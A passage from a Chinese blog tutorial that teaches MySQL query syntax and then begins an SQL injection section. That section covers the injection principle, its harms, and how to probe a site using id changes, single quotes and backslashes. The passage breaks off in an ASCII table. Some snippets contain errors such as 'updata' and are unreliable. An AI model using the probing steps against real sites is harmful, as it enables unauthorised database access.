<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span><span class="operator">|</span>replace <span class="keyword">into</span> s(sno,sn,age)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">&#x27;s9&#x27;</span>,<span class="string">&#x27;小明&#x27;</span>,<span class="number">21</span>),</span><br><span class="line">(<span class="string">&#x27;s8&#x27;</span>,<span class="string">&#x27;小红&#x27;</span>,<span class="number">20</span>)；</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>update</strong></p>
<p><strong>用于修改数据表中的数据</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">updata <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">set</span> <span class="operator">&lt;</span>字段名<span class="operator">&gt;=</span><span class="operator">&lt;</span>表达式<span class="operator">&gt;</span>...</span><br><span class="line">[<span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>];</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updata t</span><br><span class="line"><span class="keyword">set</span> dept<span class="operator">=</span><span class="string">&#x27;工学院&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>delete</strong></p>
<p>用于<strong>删除数据表中数据</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span></span><br><span class="line"><span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">[<span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>];</span><br></pre></td></tr></table></figure>

<blockquote>
<p>where句省略时，会删除表中所有记录</p>
</blockquote>
</li>
</ul>
<h4 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line">[<span class="keyword">WHERE</span> <span class="keyword">condition</span>]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>]]</span><br><span class="line">[LIMIT number];</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><code>ORDER BY column_name [ASC | DESC]</code> 是一个可选的子句，用于指定结果集的排序顺序，默认是升序（ASC）。</li>
<li><code>LIMIT number</code> 是一个可选的子句，用于限制返回的行数。</li>
</ul>
</blockquote>
<h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><ul>
<li><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><table>
<thead>
<tr>
<th align="left">操作符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&#x3D;</td>
<td align="left">等号，检测两个值是否相等，如果相等返回true</td>
<td align="left">(A &#x3D; B) 返回false。</td>
</tr>
<tr>
<td align="left">&lt;&gt;, !&#x3D;</td>
<td align="left">不等于，检测两个值是否相等，如果不相等返回true</td>
<td align="left">(A !&#x3D; B) 返回 true。</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true</td>
<td align="left">(A &gt; B) 返回false。</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true</td>
<td align="left">(A &lt; B) 返回 true。</td>
</tr>
<tr>
<td align="left">&gt;&#x3D;</td>
<td align="left">大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true</td>
<td align="left">(A &gt;&#x3D; B) 返回false。</td>
</tr>
<tr>
<td align="left">&lt;&#x3D;</td>
<td align="left">小于等于号，检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回true</td>
<td align="left">(A &lt;&#x3D; B) 返回 true。</td>
</tr>
<tr>
<td align="left">IS NULL 或者 ISNULL</td>
<td align="left">判断一个值是否为空</td>
<td align="left">如果为 NULL，返回值为 1，否则返回值为 0</td>
</tr>
<tr>
<td align="left">IS NOT NULL</td>
<td align="left">判断一个值是否不为空</td>
<td align="left">如果非 NULL，返回值为 1，否则返回值为 0</td>
</tr>
<tr>
<td align="left">BETWEEN AND</td>
<td align="left">判断一个值是否落在两个值之间</td>
<td align="left">大于等于 min 并且小于等于 max，那么返回值为 1，否则返回值为 0</td>
</tr>
<tr>
<td align="left">IN</td>
<td align="left">判断操作数是否为IN列表中的一个值</td>
<td align="left">如果是则返回1，否则返回0，对于NULL则返回NULL</td>
</tr>
<tr>
<td align="left">NOT IN</td>
<td align="left">判断操作数是否不属于IN列表</td>
<td align="left">如果是则返回1，否则返回0，对于NULL则返回NULL</td>
</tr>
<tr>
<td align="left">LIKE</td>
<td align="left">用于匹配字符串</td>
<td align="left">返回的结果值有1、0与NULL</td>
</tr>
<tr>
<td align="left">REGEXP</td>
<td align="left">正则表达式</td>
<td align="left">1. 匹配不区分大小写<br>2. 可以使用 BINARY 关键字进行区分大小写<br>3. 匹配可使用的通配符非常多，与其他通配符普适</td>
</tr>
</tbody></table>
</li>
<li><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table>
<thead>
<tr>
<th align="left">运算符号</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">NOT 或 !</td>
<td align="left">逻辑非</td>
</tr>
<tr>
<td align="left">AND</td>
<td align="left">逻辑与</td>
</tr>
<tr>
<td align="left">OR</td>
<td align="left">逻辑或</td>
</tr>
<tr>
<td align="left">XOR</td>
<td align="left">逻辑异或</td>
</tr>
</tbody></table>
</li>
<li><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>位运算符是在二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p>
<table>
<thead>
<tr>
<th align="left">运算符号</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&amp;</td>
<td align="left">按位与</td>
</tr>
<tr>
<td align="left">|</td>
<td align="left">按位或</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">按位异或</td>
</tr>
<tr>
<td align="left">!</td>
<td align="left">取反</td>
</tr>
<tr>
<td align="left">&lt;&lt;</td>
<td align="left">左移</td>
</tr>
<tr>
<td align="left">&gt;&gt;</td>
<td align="left">右移</td>
</tr>
<tr>
<td align="left">~</td>
<td align="left">按位非</td>
</tr>
</tbody></table>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">5</span> <span class="operator">&amp;</span> <span class="number">3</span>;  <span class="comment">-- 输出：1（二进制：0101 &amp; 0011 = 0001）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">5</span> <span class="operator">|</span> <span class="number">3</span>;  <span class="comment">-- 输出：7（二进制：0101 | 0011 = 0111）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">5</span> <span class="operator">^</span> <span class="number">3</span>;  <span class="comment">-- 输出：6（二进制：0101 ^ 0011 = 0110）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">~</span><span class="number">5</span>;     <span class="comment">-- 输出：-6（二进制：~0101 = 1010，在有符号二进制补码表示中）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">2</span> <span class="operator">&lt;&lt;</span> <span class="number">1</span>; <span class="comment">-- 输出：4（二进制：0010 &lt;&lt; 1 = 0100）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">4</span> <span class="operator">&gt;&gt;</span> <span class="number">1</span>; <span class="comment">-- 输出：2（二进制：0100 &gt;&gt; 1 = 0010）</span></span><br></pre></td></tr></table></figure>
</li>
<li><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><table>
<thead>
<tr>
<th align="left">通配符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>%</code></td>
<td align="left">替代 0 个或多个字符</td>
</tr>
<tr>
<td align="left"><code>_</code></td>
<td align="left">替代一个字符</td>
</tr>
<tr>
<td align="left">[]</td>
<td align="left">字符列中的任何单一字符</td>
</tr>
<tr>
<td align="left">[^] 或 [!]</td>
<td align="left">不在字符列中的任何单一字符</td>
</tr>
</tbody></table>
</li>
</ul>
<p>等于条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;test&#x27;;</span><br></pre></td></tr></table></figure>

<p>不等于条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username != &#x27;runoob&#x27;;</span><br></pre></td></tr></table></figure>

<p>大于条件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE price &gt; 50.00;</span><br></pre></td></tr></table></figure>

<p>小于条件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM orders WHERE order_date &lt; &#x27;2023-01-01&#x27;;</span><br></pre></td></tr></table></figure>

<p>大于等于条件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM employees WHERE salary &gt;= 50000;</span><br></pre></td></tr></table></figure>

<p>小于等于条件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM students WHERE age &lt;= 21;</span><br></pre></td></tr></table></figure>

<p>组合条件（AND、OR）:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category = &#x27;Electronics&#x27; AND price &gt; 100.00;</span><br><span class="line"></span><br><span class="line">SELECT * FROM orders WHERE order_date &gt;= &#x27;2023-01-01&#x27; OR total_amount &gt; 1000.00;</span><br></pre></td></tr></table></figure>

<p>模糊匹配条件（LIKE）:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM customers WHERE first_name LIKE &#x27;J%&#x27;;</span><br></pre></td></tr></table></figure>

<p>IN 条件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM countries WHERE country_code IN (&#x27;US&#x27;, &#x27;CA&#x27;, &#x27;MX&#x27;);</span><br></pre></td></tr></table></figure>

<p>NOT 条件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE NOT category = &#x27;Clothing&#x27;;</span><br></pre></td></tr></table></figure>

<p>BETWEEN 条件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM orders WHERE order_date BETWEEN &#x27;2023-01-01&#x27; AND &#x27;2023-12-31&#x27;;</span><br></pre></td></tr></table></figure>

<p>IS NULL 条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM employees WHERE department IS NULL;</span><br></pre></td></tr></table></figure>

<p>IS NOT NULL 条件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM customers WHERE email IS NOT NULL;</span><br></pre></td></tr></table></figure>

<h5 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a><strong>聚合函数</strong></h5><ul>
<li><strong>count() ：统计记录的条数；</strong></li>
<li><strong>sum()：计算字段的值的总和；</strong></li>
<li><strong>avg()：可以求出表中某个字段取值的平均值；</strong></li>
<li><strong>max()：可以求出表中某个字段取值的最大值；</strong></li>
<li><strong>min()：可以求出表中某个字段取值的最小值。</strong></li>
</ul>
<h5 id="模糊查询（LIKE）"><a href="#模糊查询（LIKE）" class="headerlink" title="模糊查询（LIKE）"></a>模糊查询（LIKE）</h5><p><code>LIKE</code> 语句是 MySQL 中用于模糊匹配查询的工具。通过使用通配符（<code>%</code> 和 <code>_</code>），我们可以灵活地查找符合特定模式的字符串。这在对文本进行搜索时非常有用。常搭配<strong>通配符</strong>。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">WHERE</span> 列名 <span class="keyword">LIKE</span> <span class="string">&#x27;模式&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h5 id="分页查询（LIMIT）"><a href="#分页查询（LIMIT）" class="headerlink" title="分页查询（LIMIT）"></a>分页查询（LIMIT）</h5><p>MySQL 的分页通常使用 <strong><code>LIMIT</code> 和 <code>OFFSET</code> 来指定返回数据的数量和起始位置</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line">LIMIT 每页记录数 <span class="keyword">OFFSET</span> 偏移量;</span><br></pre></td></tr></table></figure>

<p>或更常见的简化语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line">LIMIT 偏移量, 每页记录数;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>LIMIT</strong>：指定返回的记录数。</li>
<li><strong>OFFSET</strong>：指定开始返回的记录位置，通常和 <code>LIMIT</code> 搭配使用。</li>
</ul>
<h5 id="ORDER-BY-语句"><a href="#ORDER-BY-语句" class="headerlink" title="ORDER BY 语句"></a>ORDER BY 语句</h5><p>在 SQL 查询中，<code>ORDER BY</code> 子句用于对查询结果集按照指定列进行排序，以便得到更直观的输出。排序可以是升序或降序。默认情况下，<code>ORDER BY</code> 会对数据进行升序排序；若想使用降序，则需显式指定。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名<span class="number">1</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], 列名<span class="number">2</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>ASC</strong>：升序排列（默认）；</li>
<li><strong>DESC</strong>：降序排列；</li>
</ul>
<h5 id="分组查询（GROUP-BY）"><a href="#分组查询（GROUP-BY）" class="headerlink" title="分组查询（GROUP BY）"></a>分组查询（GROUP BY）</h5><p>在 MySQL 中，<code>GROUP BY</code> 语句<strong>用于将查询结果中的行按指定列分组，并对每个分组进行聚合操作。</strong> <code>GROUP BY</code> 经常与聚合函数（如 <code>COUNT</code>、<code>SUM</code>、<code>AVG</code> 等）一起使用，用于计数、求和、求平均值，或其他分组计算。<code>HAVING</code> 子句用于筛选分组后的结果。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span>, 聚合函数(列<span class="number">2</span>)</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">WHERE</span> 条件</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> 列<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>列1</strong>：需要分组的字段。</li>
<li>**聚合函数(列2)**：对每个分组应用的聚合函数，如 <code>COUNT</code>、<code>SUM</code>、<code>AVG</code> 等。</li>
<li><strong>GROUP BY</strong>：指定按哪一个或多个列分组。</li>
</ul>
<h5 id="合并查询结果（UNION）"><a href="#合并查询结果（UNION）" class="headerlink" title="合并查询结果（UNION）"></a>合并查询结果（UNION）</h5><p>在 MySQL 中，<code>UNION</code> 操作符用于合并<strong>两个</strong>或<strong>多个</strong> <code>SELECT</code> 查询的结果，并将它们组合成一个结果集。<code>UNION</code> 可以帮助我们将多张表的结果汇总，并且自动去除重复行。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span>, 列<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表<span class="number">1</span></span><br><span class="line">[<span class="keyword">WHERE</span> 条件]</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span>, 列<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表<span class="number">2</span></span><br><span class="line">[<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>SELECT</strong>：用于定义查询语句，指定要查询的列和表。</li>
<li><strong>UNION</strong>：用于将多个查询的结果合并在一起。</li>
<li><strong>WHERE</strong>：可选项，可以对每个查询设置条件。</li>
</ul>
<blockquote>
<p><strong>注意</strong>：每个 <code>SELECT</code> 查询的列数和数据类型必须一致，以便在结果中按列正确合并。</p>
</blockquote>
<h5 id="关联查询（join）"><a href="#关联查询（join）" class="headerlink" title="关联查询（join）"></a>关联查询（join）</h5><p>在 MySQL 中，<code>JOIN</code> 操作<strong>用于从多个表中查询相关联的数据。</strong> 通过 <code>JOIN</code> 可以把符合条件的数据从不同的表合并在一起，使得复杂的数据查询和关联分析更加便捷。</p>
<p>MySQL 中常见的 <code>JOIN</code> 类型有：**<code>INNER JOIN</code>、<code>LEFT JOIN</code>、<code>RIGHT JOIN</code> 和 <code>FULL JOIN</code>（不直接支持）**，不同类型的 <code>JOIN</code> 会根据需要获取交集、左连接、右连接或完整的并集数据。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 表<span class="number">1.</span>列名, 表<span class="number">2.</span>列名, ...</span><br><span class="line"><span class="keyword">FROM</span> 表<span class="number">1</span></span><br><span class="line"><span class="keyword">JOIN</span> 表<span class="number">2</span></span><br><span class="line"><span class="keyword">ON</span> 表<span class="number">1.</span>关联列 <span class="operator">=</span> 表<span class="number">2.</span>关联列;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>JOIN</strong>：表示连接操作。</li>
<li><strong>ON</strong>：用于指定两个表之间的关联条件。</li>
<li><strong>表1.列名</strong> 和 <strong>表2.列名</strong>：用于选择需要的列。</li>
</ul>
</blockquote>
<ul>
<li><h4 id="INNER-JOIN（内连接）"><a href="#INNER-JOIN（内连接）" class="headerlink" title="INNER JOIN（内连接）"></a><strong>INNER JOIN（内连接）</strong></h4><p><code>INNER JOIN</code> 仅返回两个表中匹配的记录，即满足条件的交集部分。如果没有匹配的记录，不会出现在结果中。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employees.name, departments.dept_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> departments <span class="keyword">ON</span> employees.dept_id <span class="operator">=</span> departments.dept_id;</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="LEFT-JOIN（左连接）"><a href="#LEFT-JOIN（左连接）" class="headerlink" title="LEFT JOIN（左连接）"></a>LEFT JOIN（左连接）</h4><p><code>LEFT JOIN</code> 会返回左表中的所有记录，即使右表中没有对应匹配的记录。对于没有匹配的右表记录，用 <code>NULL</code> 填充。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employees.name, departments.dept_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> departments <span class="keyword">ON</span> employees.dept_id <span class="operator">=</span> departments.dept_id;</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="RIGHT-JOIN（右连接）"><a href="#RIGHT-JOIN（右连接）" class="headerlink" title="RIGHT JOIN（右连接）"></a>RIGHT JOIN（右连接）</h4><p><code>RIGHT JOIN</code> 和 <code>LEFT JOIN</code> 类似，但会<strong>返回右表中的所有记录</strong>，即使左表中没有匹配记录。对于没有匹配的左表记录，用 <code>NULL</code> 填充。</p>
</li>
<li><h4 id="CROSS-JOIN（笛卡尔积）"><a href="#CROSS-JOIN（笛卡尔积）" class="headerlink" title="CROSS JOIN（笛卡尔积）"></a>CROSS JOIN（笛卡尔积）</h4><p><code>CROSS JOIN</code> 不需要 <code>ON</code> 条件，它会将左表和右表的所有组合列出，适合在需要笛卡尔积时使用。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employees.name, departments.dept_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">CROSS</span> <span class="keyword">JOIN</span> departments;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>假设 <code>employees</code> 表有 4 条记录，<code>departments</code> 表有 3 条记录，则结果会包含 4 × 3 &#x3D; 12 条记录。</p>
</blockquote>
</li>
</ul>
<h5 id="子查询与嵌套查询"><a href="#子查询与嵌套查询" class="headerlink" title="子查询与嵌套查询"></a>子查询与嵌套查询</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span></span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">WHERE</span> 列名 <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> 列名</span><br><span class="line">    <span class="keyword">FROM</span> 另一表</span><br><span class="line">    <span class="keyword">WHERE</span> 条件</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ%E6%88%AA%E5%9B%BE20240325161309.png"></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>SQL注入</strong>指攻击者通过在输入字段中插入恶意的SQL代码，干扰或篡改数据库的正常查询逻辑，从而获取、篡改或删除数据库中的数据。</p>
<p>SQL注入漏洞产生的两个条件：</p>
<ul>
<li>参数用户可控：前端传给后端的参数内容是用户可以控制的。</li>
<li>参数带入数据库查询：传入的参数拼接到SQL语句并带入数据库查询。</li>
</ul>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
<li>绕过登录验证：使用万能密码登录网站后台等。</li>
<li>获取敏感数据：获取网站管理员帐号、密码等。</li>
<li>文件系统操作：列目录，读取、写入文件等。</li>
<li>注册表操作：读取、写入、删除注册表等。</li>
<li>执行系统命令：远程执行命令。</li>
</ul>
<h3 id="SQL注入判断及注入点分类"><a href="#SQL注入判断及注入点分类" class="headerlink" title="SQL注入判断及注入点分类"></a>SQL注入判断及注入点分类</h3><p>判断是否存在注入：</p>
<ul>
<li>通过改变id的数值，将参数值+1或-1，然后查看页面展示的内容是否会变化，如果页面会发生变化，则我们就可以初步判断，这个id会带入数据库查询，查询后的内容会显示到页面中来。</li>
<li>通过添加了单引号之后，如果页面中直接进行了报错，并且报错的信息显示到了页面中来，说明我们输入的单引号被带入了数据库查询，我们就可以直接判断此处存在sql注入漏洞。并且结合之前判断的页面是否有回显，就可以尝试进行联合查询注入或是报错注入。</li>
</ul>
<p>闭合符判断：</p>
<p>通过使用<code>\</code>来判断。<code>\</code>后面的跟着的是什么字符，那么它的闭合字符就是什么，若是没有，就为数字型。</p>
<h2 id="注入常用参数"><a href="#注入常用参数" class="headerlink" title="注入常用参数"></a>注入常用参数</h2><h3 id="ASCII码表"><a href="#ASCII码表" class="headerlink" title="ASCII码表"></a>ASCII码表</h3><table>
<thead>
<tr>
<th>00100000</th>
<th>32</th>
<th>20</th>
<th>(Space)</th>
<th>空格</th>
</tr>
</thead>
<tbody><tr>
<td>00100001</td>
<td>33</td>
<td>21</td>
<td>!</td>
<td></td>
</tr>
<tr>
<td>00100010</td>
<td>34</td>
<td>22</td>
<td>“</td>
<td></td>
</tr>
<tr>
<td>00100011</td>
<td>35</td>
<td>23</td>
<td>#</td>
<td></td>
</tr>
<tr>
<td>00100100</td>
<td>36</td>
<td>24</td>
<td>$</td>
<td></td>
</tr>
<tr>
<td>00100101</td>
<td>37</td>
<td>25</td>
<td>%</td>
<td></td>
</tr>
<tr>
<td>00100110</td>
<td>38</td>
<td>26</td>
<td>&amp;</td>
<td></td>
</tr>
<tr>
<td>00100111</td>
<td>39</td>
<td>27</td>
<td>‘</td>
<td></td>
</tr>
<tr>
<td>00101000</td>
<td>40</td>
<td>28</td>
<td>(</td>
<td></td>
</tr>
<tr>
<td>00101001</td>
<td>41</td>
<td>29</td>
<td>)</td>
<td></td>
</tr>
<tr>
<td>00101010</td>
<td>42</td>
<td>2A</td>
<td>*</td>
<td></td>
</tr>
<tr>
<td>00101011</td>
<td>43</td>
<td>2B</td>
<td>+</td>
<td></td>
</tr>
<tr>
<td>00101100</td>
<td>44</td>
<td>2C</td>
<td>,</td>
<td></td>
</tr>
<tr>
<td>00101101</td>
<td>45</td>
<td>2D</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>00101110</td>
<td>46</td>
<td>2E</td>
<td>.</td>
<td></td>
</tr>
<tr>
<td>00101111</td>
<td>47</td>
<td>2F</td>
<td>&#x2F;</td>
<td></td>
</tr>
<tr>
<td>00110000</td>
<td>48</td>
<td>30</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>00110001</td>
<td>49</td>
<td>31</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>00110010</td>
<td>50</td>
<td>32</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>00110011</td>
<td>51</td>
<td>33</td>
<td>3</td>
<td></td>
</tr>
<tr>
<td>00110100</td>
<td>52</td>
<td>34</td>
<td>4</td>
<td></td>
</tr>
<tr>
<td>00110101</td>
<td>53</td>
<td>35</td>
<td>5</td>
<td></td>
</tr>
<tr>
<td>00110110</td>
<td>54</td>
<td>36</td>
<td>6</td>
<td></td>
</tr>
<tr>
<td>00110111</td>
<td>55</td>
<td>37</td>
<td>7</td>
<td></td>
</tr>
<tr>
<td>00111000</td>
<td>56</td>
<td>38</td>
<td>8</td>
<td></td>
</tr>
<tr>
<td>00111001</td>
<td>57</td>
<td>39</td>
<td>9</td>
<td></td>
</tr>
<tr>
<td>00111010</td>
<td>58</td>
<td>3A</td>
<td>:</td>
<td></td>
</tr>
<tr>
<td>00111011</td>
<td>59</td>
<td>3B</td>
<td>;</td>
<td></td>
</tr>
<tr>
<td>00111100</td>
<td>60</td>
<td>3C</td>
<td>&lt;</td>
<td></td>
</tr>
<tr>
<td>00111101</td>
<td>61</td>
<td>3D</td>
<td>&#x3D;</td>
<td></td>
</tr>
